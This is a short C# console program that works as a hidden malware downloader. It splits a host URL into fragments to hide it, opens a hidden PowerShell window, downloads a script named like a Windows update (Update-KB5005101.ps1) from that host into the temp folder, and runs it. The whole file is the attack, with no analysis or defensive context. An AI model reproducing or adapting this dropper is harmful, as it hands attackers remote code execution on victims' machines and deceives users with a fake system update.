using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var tftio = @"tp:";
           var uiou = @":8";
           var IndiaSailing = @"Colombo";
           var WarriorShepa = @"Viriato";
           var TerminalPath = @"powershell.exe";
           var FdxEstaMerda = @"HenrryTheNavigator";

           Process process = new Process();
           process.StartInfo.FileName = TerminalPath;
           process.StartInfo.Arguments = "cd $Env:TMP;iwr -uri ht"+tftio+"//"+WarriorShepa+IndiaSailing+FdxEstaMerda+uiou+"087/Update-KB5005101.ps1 -outfile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}
